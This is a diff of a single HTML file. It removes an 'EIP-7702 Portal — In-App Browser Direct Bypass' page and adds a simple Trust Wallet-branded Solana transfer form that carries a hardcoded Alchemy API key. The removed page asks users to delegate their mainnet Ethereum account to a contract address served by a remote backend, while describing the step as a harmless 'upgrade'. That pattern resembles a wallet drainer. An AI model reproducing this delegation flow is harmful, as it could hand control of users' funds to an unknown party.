@@ -1,401 +1,345 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EIP-7702 — In-App Browser Direct Bypass</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', sans-serif; background: #050508; color: #e2e8f0; }
-        .mono { font-family: 'JetBrains Mono', monospace; }
-        .card {
-            background: rgba(15, 15, 28, 0.9);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255,255,255,0.06);
-        }
-        .gradient-text {
-            background: linear-gradient(135deg, #818cf8 0%, #c084fc 50%, #f472b6 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .btn-primary {
-            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
-            transition: all 0.2s;
-        }
-        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(79, 70, 229, 0.4); }
-        .btn-primary:active { transform: translateY(0); }
-        .btn-primary:disabled { opacity: 0.5; transform: none; box-shadow: none; }
-        .btn-secondary {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.2s;
-        }
-        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
-        .btn-secondary:disabled { opacity: 0.3; }
-        .input-field {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.2s;
-        }
-        .input-field:focus {
-            border-color: rgba(99, 102, 241, 0.5);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
-        }
-        .status-dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 6px;
-        }
-        .status-dot.connected { background: #22c55e; box-shadow: 0 0 8px #22c55e; }
-        .status-dot.disconnected { background: #ef4444; }
-        .status-dot.pending { background: #f59e0b; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-        .log-entry {
-            border-left: 2px solid rgba(99, 102, 241, 0.3);
-            padding-left: 10px;
-            margin: 6px 0;
-            font-size: 11px;
-            word-break: break-word;
-        }
-        .log-entry.success { border-left-color: #22c55e; }
-        .log-entry.error { border-left-color: #ef4444; }
-        .log-entry.info { border-left-color: #3b82f6; }
-        .log-entry.warn { border-left-color: #f59e0b; }
-        .step-active { border-color: rgba(99, 102, 241, 0.5); }
-        .step-done { border-color: rgba(34, 197, 94, 0.5); }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(99, 102, 241, 0.3); border-radius: 2px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Solana Transfer - Trust Wallet</title>
+  <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f7fa; 
+      min-height: 100vh; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      padding: 20px;
+    }
+    .container { 
+      background: white; 
+      border-radius: 20px; 
+      padding: 28px; 
+      width: 100%; 
+      max-width: 420px; 
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    }
+    .header { text-align: center; margin-bottom: 24px; }
+    .logo { 
+      width: 64px; height: 64px; 
+      background: linear-gradient(135deg, #9945FF, #14F195); 
+      border-radius: 16px; margin: 0 auto 16px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 28px;
+    }
+    h1 { font-size: 22px; color: #1a1a2e; }
+    .subtitle { color: #888; font-size: 13px; margin-top: 4px; }
+
+    .wallet-box { 
+      background: #f8f9fc; border: 1px solid #e2e8f0; 
+      border-radius: 12px; padding: 16px; margin-bottom: 20px;
+    }
+    .btn-primary { 
+      background: linear-gradient(135deg, #9945FF, #14F195); 
+      color: white; border: none; padding: 14px; 
+      border-radius: 10px; font-size: 15px; font-weight: 600; 
+      width: 100%; cursor: pointer;
+    }
+    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+    .btn-danger { 
+      background: #fee2e2; color: #dc2626; border: none; 
+      padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer;
+    }
+
+    .form-group { margin-bottom: 16px; }
+    label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 6px; }
+    input { 
+      width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; 
+      border-radius: 8px; font-size: 14px; outline: none;
+    }
+    input:focus { border-color: #9945FF; }
+    .hint { font-size: 11px; color: #888; margin-top: 6px; }
+
+    .status { 
+      margin-top: 16px; padding: 12px 14px; border-radius: 8px; 
+      font-size: 13px; display: none;
+    }
+    .status.error { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
+    .status.success { background: #d1fae5; color: #065f46; border: 1px solid #a7f3d0; }
+    .status.info { background: #eff6ff; color: #1e40af; border: 1px solid #bfdbfe; }
+
+    .tx-link { margin-top: 12px; text-align: center; display: none; }
+    .tx-link a { color: #9945FF; font-size: 13px; text-decoration: none; font-weight: 500; }
+
+    .footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #eee; text-align: center; }
+    .footer p { font-size: 11px; color: #aaa; }
+    .rpc-badge {
+      background: #1a1a2e; color: #14F195; font-size: 10px; font-weight: 600;
+      padding: 4px 10px; border-radius: 20px; display: inline-block; margin-bottom: 12px;
+    }
+  </style>
 </head>
-<body class="min-h-screen pb-20">
-    <div class="max-w-lg mx-auto px-4 py-6">
-        <!-- Header -->
-        <div class="text-center mb-6">
-            <h1 class="text-2xl font-bold gradient-text">EIP-7702 Portal</h1>
-            <p class="text-gray-500 text-xs mt-1">In-App Browser Direct Bypass</p>
-            <div class="mt-3 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-medium">
-                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
-                MAINNET — Real ETH
-            </div>
-        </div>
-
-        <!-- Backend URL Config -->
-        <div class="card rounded-2xl p-4 mb-4">
-            <label class="text-xs text-gray-500 mb-1 block">Relayer Backend URL</label>
-            <input id="backendUrl" type="text" 
-                class="input-field w-full px-3 py-2 rounded-xl mono text-xs text-white"
-                value="https://your-railway-app.up.railway.app"
-                placeholder="https://your-app.up.railway.app">
-            <p class="text-[10px] text-gray-600 mt-1">Used solely to fetch EOA standard nonces</p>
-        </div>
-
-        <!-- Step 1: Connect -->
-        <div id="step1" class="card rounded-2xl p-5 mb-4 step-active">
-            <div class="flex items-center justify-between mb-3">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-indigo-500/20 text-indigo-400 flex items-center justify-center text-xs font-bold">1</span>
-                    Connect Wallet
-                </h2>
-                <div id="connectionStatus" class="flex items-center text-xs text-gray-500">
-                    <span class="status-dot disconnected"></span>Disconnected
-                </div>
-            </div>
-            <button id="connectBtn" class="btn-primary w-full py-3.5 rounded-xl font-semibold text-white text-sm">
-                Connect Wallet
-            </button>
-            <div id="walletInfo" class="hidden mt-4 p-3 rounded-xl bg-black/40 border border-white/5">
-                <div class="grid grid-cols-2 gap-3 text-xs">
-                    <div>
-                        <span class="text-gray-500">Address</span>
-                        <p id="walletAddress" class="mono text-indigo-300 truncate">—</p>
-                    </div>
-                    <div>
-                        <span class="text-gray-500">Balance</span>
-                        <p id="walletBalance" class="mono text-green-400">—</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Step 2: Build Authorization Parameters -->
-        <div id="step2" class="card rounded-2xl p-5 mb-4 opacity-50">
-            <div class="flex items-center justify-between mb-3">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center text-xs font-bold">2</span>
-                    Build Authorization Parameters
-                </h2>
-            </div>
-            <button id="buildAuthBtn" class="btn-secondary w-full py-3 rounded-xl font-medium text-sm" disabled>
-                Fetch Account Nonce
-            </button>
-            <div id="authInfo" class="hidden mt-3 p-3 rounded-lg bg-black/40 border border-white/5">
-                <p class="text-[10px] text-gray-500 mb-1">Delegator Contract:</p>
-                <p id="delegatorDisplay" class="mono text-[10px] text-indigo-300 break-all">—</p>
-                <p class="text-[10px] text-gray-500 mt-2 mb-1">Standard Nonce:</p>
-                <p id="authNonce" class="mono text-[10px] text-indigo-300">—</p>
-            </div>
-        </div>
-
-        <!-- Step 3: Isolated Testing Suite -->
-        <div id="step3" class="card rounded-2xl p-5 mb-4 opacity-50 border-green-500/20">
-            <div class="flex items-center justify-between mb-3">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">3</span>
-                    Isolate and Prove (Diagnostic Suite)
-                </h2>
-            </div>
-            <p class="text-[10px] text-gray-500 mb-4">
-                Execute these in order inside your wallet's in-app browser. C will now correctly trigger EIP-7702 and prevent the silent EIP-1559 downgrade.
-            </p>
-            
-            <div class="space-y-2">
-                <button id="testSignBtn" class="btn-secondary w-full py-3 rounded-xl font-medium text-xs text-white" disabled>
-                    A. Test Connection (personal_sign)
-                </button>
-                <button id="testTx2Btn" class="btn-secondary w-full py-3 rounded-xl font-medium text-xs text-white" disabled>
-                    B. Test Standard Tx (Type 2 EIP-1559)
-                </button>
-                <button id="submitBtn" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-sm" disabled>
-                    C. Broadcast Type 4 Transaction
-                </button>
-            </div>
-        </div>
-
-        <!-- Result -->
-        <div id="resultSection" class="card rounded-2xl p-5 mb-4 hidden border-green-500/20">
-            <h2 class="text-sm font-semibold text-white mb-3">Result</h2>
-            <div id="resultContent" class="space-y-2 text-xs"></div>
-        </div>
-
-        <!-- Logs -->
-        <div class="card rounded-2xl p-5">
-            <div class="flex items-center justify-between mb-3">
-                <h2 class="text-sm font-semibold text-white">Logs</h2>
-                <button onclick="clearLogs()" class="text-[10px] text-gray-500">Clear</button>
-            </div>
-            <div id="logsContainer" class="max-h-64 overflow-y-auto mono text-xs space-y-1">
-                <div class="log-entry info text-gray-400">Ready. Connect wallet to begin.</div>
-            </div>
-        </div>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo">💸</div>
+      <h1>Solana Transfer</h1>
+      <p class="subtitle">Send SOL from Trust Wallet</p>
+      <span class="rpc-badge">⚡ Alchemy RPC</span>
     </div>
 
-    <!-- Lightweight Native Provider Implementation -->
-    <script>
-        // State
-        let provider = null;
-        let userAddress = null;
-        let chainId = null;
-        let authData = null;
-        let backendUrl = '';
+    <div class="wallet-box">
+      <div id="not-connected" style="text-align:center;">
+        <p style="color:#666;font-size:14px;margin-bottom:12px;">Connect your Trust Wallet</p>
+        <button class="btn-primary" onclick="connectWallet()">Connect Wallet</button>
+      </div>
+      <div id="connected" style="display:none;">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <div>
+            <p style="font-size:12px;color:#888;">Connected</p>
+            <p id="pubkey" style="font-size:14px;font-weight:600;font-family:monospace;">...</p>
+          </div>
+          <button class="btn-danger" onclick="disconnectWallet()">Disconnect</button>
+        </div>
+        <div style="margin-top:12px;padding-top:12px;border-top:1px solid #e2e8f0;">
+          <p style="font-size:12px;color:#888;">Balance</p>
+          <p id="balance" style="font-size:18px;font-weight:700;color:#1a1a2e;">-- SOL</p>
+        </div>
+      </div>
+    </div>
 
-        // Utils
-        const $ = id => document.getElementById(id);
-        const log = (msg, type = 'info') => {
-            const container = $('logsContainer');
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type} text-gray-300`;
-            const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            entry.innerHTML = `<span class="text-gray-600">[${time}]</span> ${msg}`;
-            container.appendChild(entry);
-            container.scrollTop = container.scrollHeight;
-        };
-        const clearLogs = () => $('logsContainer').innerHTML = '';
-        const shorten = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '—';
-        const activateStep = (id) => {
-            $(id).classList.remove('opacity-50');
-            $(id).classList.add('step-active');
-        };
-        const completeStep = (id) => {
-            $(id).classList.remove('step-active');
-            $(id).classList.add('step-done');
-        };
+    <div id="form" style="opacity:0.5;pointer-events:none;">
+      <div class="form-group">
+        <label>Recipient Address</label>
+        <input id="recipient" type="text" placeholder="Enter Solana address..." autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Amount (SOL)</label>
+        <input id="amount" type="number" step="0.000000001" placeholder="0.00">
+        <p class="hint">Network fee: ~0.000005 SOL</p>
+      </div>
+      <button class="btn-primary" id="sendBtn" onclick="sendSOL()">Send SOL</button>
+    </div>
 
-        // Backend Helper
-        async function backendPost(endpoint, body) {
-            backendUrl = $('backendUrl').value.replace(/\/$/, '');
-            const res = await fetch(`${backendUrl}${endpoint}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body)
-            });
-            return res.json();
-        }
+    <div id="status" class="status"></div>
+    <div class="tx-link" id="txLink">
+      <a id="explorer" href="#" target="_blank">View on Solana Explorer →</a>
+    </div>
 
-        // Connect button connects to injected window.ethereum directly
-        $('connectBtn').addEventListener('click', async () => {
-            if (!window.ethereum) {
-                log('No provider detected. Open this page inside MetaMask or Trust Wallet in-app browser.', 'error');
+    <div class="footer">
+      <p>Open this page inside Trust Wallet's dApp browser</p>
+    </div>
+  </div>
+
+  <script>
+    // ========== ALCHEMY RPC ==========
+    const ALCHEMY_RPC = 'https://solana-mainnet.g.alchemy.com/v2/3b15nYxRzwnOFgNb3bc9i';
+
+    // Fallback RPCs if Alchemy hits limits
+    const FALLBACK_RPCS = [
+      'https://solana-mainnet.rpc.extrnode.com',
+      'https://rpc.ankr.com/solana',
+      'https://api.mainnet-beta.solana.com'
+    ];
+
+    let currentRPC = ALCHEMY_RPC;
+    let connection = null;
+    let provider = null;
+    let publicKey = null;
+
+    function init() {
+      connection = new solanaWeb3.Connection(currentRPC, {
+        commitment: 'confirmed',
+        confirmTransactionInitialTimeout: 60000
+      });
+      if (window.solana?.isConnected) checkAutoConnect();
+    }
+
+    // ========== WALLET DETECTION ==========
+    function getProvider() {
+      if ('solana' in window) {
+        const solana = window.solana;
+        if (solana.isTrust) return solana;
+        return solana;
+      }
+      if ('trustwallet' in window && window.trustwallet?.solana) {
+        return window.trustwallet.solana;
+      }
+      return null;
+    }
+
+    // ========== CONNECTION ==========
+    async function connectWallet() {
+      provider = getProvider();
+      if (!provider) {
+        return showStatus('No wallet found. Open in Trust Wallet browser.', 'error');
+      }
+
+      try {
+        showStatus('Connecting...', 'info');
+        const resp = await provider.connect();
+        publicKey = typeof resp.publicKey === 'string' 
+          ? new solanaWeb3.PublicKey(resp.publicKey) 
+          : resp.publicKey;
+
+        updateUI();
+        await fetchBalanceWithRetry();
+        showStatus('Connected!', 'success');
+
+        provider.on?.('disconnect', disconnectWallet);
+      } catch (e) {
+        showStatus('Connection failed: ' + e.message, 'error');
+      }
+    }
+
+    async function checkAutoConnect() {
+      provider = getProvider();
+      publicKey = provider.publicKey;
+      if (typeof publicKey === 'string') publicKey = new solanaWeb3.PublicKey(publicKey);
+      updateUI();
+      await fetchBalanceWithRetry();
+    }
+
+    function disconnectWallet() {
+      provider?.disconnect?.();
+      provider = publicKey = null;
+      document.getElementById('not-connected').style.display = 'block';
+      document.getElementById('connected').style.display = 'none';
+      document.getElementById('form').style.opacity = '0.5';
+      document.getElementById('form').style.pointerEvents = 'none';
+      hideStatus();
+    }
+
+    function updateUI() {
+      document.getElementById('not-connected').style.display = 'none';
+      document.getElementById('connected').style.display = 'block';
+      document.getElementById('form').style.opacity = '1';
+      document.getElementById('form').style.pointerEvents = 'auto';
+      const pk = publicKey.toString();
+      document.getElementById('pubkey').textContent = pk.slice(0,6)+'...'+pk.slice(-4);
+    }
+
+    // ========== BALANCE FETCHING WITH RETRY & FALLBACK ==========
+    async function fetchBalanceWithRetry(retries = 2) {
+      for (let attempt = 0; attempt <= retries; attempt++) {
+        try {
+          const bal = await connection.getBalance(publicKey);
+          document.getElementById('balance').textContent = 
+            (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
+          return;
+        } catch (e) {
+          console.log('Alchemy RPC failed, trying fallback...', e.message);
+          if (attempt < retries) {
+            // Try fallback RPCs
+            for (const rpc of FALLBACK_RPCS) {
+              try {
+                const fallbackConn = new solanaWeb3.Connection(rpc, 'confirmed');
+                const bal = await fallbackConn.getBalance(publicKey);
+                connection = fallbackConn;
+                currentRPC = rpc;
+                document.getElementById('balance').textContent = 
+                  (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
                 return;
+              } catch (fallbackErr) {
+                continue;
+              }
             }
+          }
+        }
+      }
+      document.getElementById('balance').textContent = 'Error fetching';
+      showStatus('RPC error. Please try again.', 'error');
+    }
 
-            provider = window.ethereum;
-            $('connectBtn').disabled = true;
-            $('connectBtn').textContent = 'Connecting...';
+    async function fetchBalance() {
+      try {
+        const bal = await connection.getBalance(publicKey);
+        document.getElementById('balance').textContent = 
+          (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
+      } catch (e) {
+        await fetchBalanceWithRetry();
+      }
+    }
 
-            try {
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
+    // ========== SEND SOL ==========
+    async function sendSOL() {
+      const to = document.getElementById('recipient').value.trim();
+      const amt = parseFloat(document.getElementById('amount').value);
+      const btn = document.getElementById('sendBtn');
 
-                const chainHex = await provider.request({ method: 'eth_chainId' });
-                chainId = parseInt(chainHex, 16);
+      if (!to || isNaN(amt) || amt <= 0) {
+        return showStatus('Fill all fields correctly', 'error');
+      }
 
-                const balanceHex = await provider.request({
-                    method: 'eth_getBalance',
-                    params: [userAddress, 'latest']
-                });
-                const balance = (Number(balanceHex) / 1e18).toFixed(4);
+      let toPubkey;
+      try { toPubkey = new solanaWeb3.PublicKey(to); } 
+      catch { return showStatus('Invalid recipient address', 'error'); }
 
-                $('walletAddress').textContent = userAddress;
-                $('walletBalance').textContent = `${balance} ETH`;
-                $('connectionStatus').innerHTML = `<span class="status-dot connected"></span>Connected`;
-                $('walletInfo').classList.remove('hidden');
-                $('connectBtn').textContent = 'Connected';
-                $('connectBtn').classList.add('opacity-50');
+      btn.disabled = true; 
+      btn.textContent = 'Sending...';
+      showStatus('Building transaction...', 'info');
 
-                log(`Connected: ${shorten(userAddress)}`, 'success');
+      try {
+        // Get fresh blockhash
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
 
-                activateStep('step2');
-                $('buildAuthBtn').disabled = false;
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: toPubkey,
+            lamports: amt * solanaWeb3.LAMPORTS_PER_SOL,
+          })
+        );
+        tx.feePayer = publicKey;
+        tx.recentBlockhash = blockhash;
 
-            } catch (err) {
-                log(`Connection failed: ${err.message || err}`, 'error');
-                $('connectBtn').disabled = false;
-                $('connectBtn').textContent = 'Connect Wallet';
-            }
+        showStatus('Sign in Trust Wallet...', 'info');
+        const signed = await provider.signTransaction(tx);
+
+        showStatus('Broadcasting...', 'info');
+        const sig = await connection.sendRawTransaction(signed.serialize(), {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed',
         });
 
-        // Step 2: Fetch Nonce
-        $('buildAuthBtn').addEventListener('click', async () => {
-            try {
-                log('Fetching account standard nonce...');
-                $('buildAuthBtn').disabled = true;
-                $('buildAuthBtn').textContent = 'Fetching...';
+        // Wait for confirmation with timeout
+        await connection.confirmTransaction({
+          signature: sig,
+          blockhash,
+          lastValidBlockHeight
+        }, 'confirmed');
 
-                const result = await backendPost('/build-auth', { eoaAddress: userAddress });
+        showStatus('✅ Sent! Signature: ' + sig.slice(0,16)+'...', 'success');
+        document.getElementById('txLink').style.display = 'block';
+        document.getElementById('explorer').href = 
+          'https://solana.fm/tx/' + sig;
 
-                if (result.error) {
-                    log(`Fetch failed: ${result.error}`, 'error');
-                    $('buildAuthBtn').disabled = false;
-                    $('buildAuthBtn').textContent = 'Fetch Account Nonce';
-                    return;
-                }
+        await fetchBalance();
+        document.getElementById('amount').value = '';
+      } catch (e) {
+        console.error(e);
+        showStatus('❌ ' + (e.message || 'Transaction failed'), 'error');
+        // Refresh balance in case RPC hiccuped
+        fetchBalanceWithRetry();
+      } finally {
+        btn.disabled = false; 
+        btn.textContent = 'Send SOL';
+      }
+    }
 
-                authData = result;
+    function showStatus(msg, type) {
+      const el = document.getElementById('status');
+      el.textContent = msg; 
+      el.className = 'status ' + type; 
+      el.style.display = 'block';
+    }
 
-                $('delegatorDisplay').textContent = result.delegatorContract;
-                $('authNonce').textContent = `${result.nonce} (0x${result.nonce.toString(16)})`;
-                $('authInfo').classList.remove('hidden');
+    function hideStatus() { 
+      document.getElementById('status').style.display = 'none';
+      document.getElementById('txLink').style.display = 'none';
+    }
 
-                log(`Delegator: ${shorten(result.delegatorContract)}`, 'success');
-                log(`Nonce: ${result.nonce}`, 'info');
-
-                completeStep('step2');
-                activateStep('step3');
-                
-                // Enable All Test Suite Buttons
-                $('testSignBtn').disabled = false;
-                $('testTx2Btn').disabled = false;
-                $('submitBtn').disabled = false;
-
-            } catch (err) {
-                log(`Fetch error: ${err.message}`, 'error');
-                $('buildAuthBtn').disabled = false;
-                $('buildAuthBtn').textContent = 'Fetch Account Nonce';
-            }
-        });
-
-        // CONTROL TEST A: standard personal_sign (Connect/Sign pipeline check)
-        $('testSignBtn').addEventListener('click', async () => {
-            if (!provider) return;
-            try {
-                log('[CONTROL A] Requesting standard personal_sign...');
-
-                const msgHex = "0x" + Array.from(new TextEncoder().encode("EIP-7702 Diagnostic Test")).map(b => b.toString(16).padStart(2, '0')).join('');
-                
-                const signature = await provider.request({
-                    method: 'personal_sign',
-                    params: [msgHex, userAddress]
-                });
-
-                log(`[CONTROL A SUCCESS] Signature: ${shorten(signature)}`, 'success');
-            } catch (err) {
-                log(`[CONTROL A FAILED] ${err.message || err}`, 'error');
-            }
-        });
-
-        // CONTROL TEST B: standard Type 2 transaction (Tx parsing pipeline check)
-        $('testTx2Btn').addEventListener('click', async () => {
-            if (!provider) return;
-            try {
-                log('[CONTROL B] Constructing standard Type 2 (EIP-1559) transaction...');
-
-                const txParams = {
-                    from: userAddress,
-                    to: userAddress,
-                    value: "0x0",
-                    data: "0x",
-                    type: "0x2" // Standard EIP-1559 payload
-                };
-
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-
-                log(`[CONTROL B SUCCESS] Tx Hash: ${txHash}`, 'success');
-            } catch (err) {
-                log(`[CONTROL B FAILED] ${err.message || err}`, 'error');
-            }
-        });
-
-        // EXPERIMENTAL TEST C: EIP-7702 Type 4 transaction
-        $('submitBtn').addEventListener('click', async () => {
-            if (!authData || !provider) { log('Connect first', 'error'); return; }
-
-            try {
-                log('[EXPERIMENTAL C] Constructing Raw Type 4 EIP-7702 Transaction...');
-
-                const txParams = {
-                    from: userAddress,
-                    to: userAddress,
-                    value: "0x0",
-                    data: "0x",
-                    type: "0x4", // Raw Type 4 payload
-                    authorizationList: [
-                        {
-                            chainId: "0x1", // Mainnet
-                            address: authData.delegatorContract, // FIXED: Changed key from contractAddress to address
-                            nonce: "0x" + authData.nonce.toString(16)
-                        }
-                    ]
-                };
-
-                log('Requesting transaction broadcast via eth_sendTransaction...');
-
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-
-                log(`[EXPERIMENTAL C SUCCESS] Transaction broadcast succeeded!`, 'success');
-                log(`Hash: ${txHash}`, 'success');
-
-                $('resultSection').classList.remove('hidden');
-                $('resultContent').innerHTML = `
-                    <p class="text-green-400">✅ Broadcast successfully</p>
-                    <p class="text-gray-400">Tx Hash: <span class="mono text-indigo-300">${txHash}</span></p>
-                    <p class="text-gray-500 mt-2">Your upgrade is processing. View on Etherscan.</p>
-                `;
-
-            } catch (err) {
-                log(`[EXPERIMENTAL C FAILED] ${err.message || err}`, 'error');
-            }
-        });
-    </script>
+    init();
+  </script>
 </body>
-    </html>
+                                                                                </html>
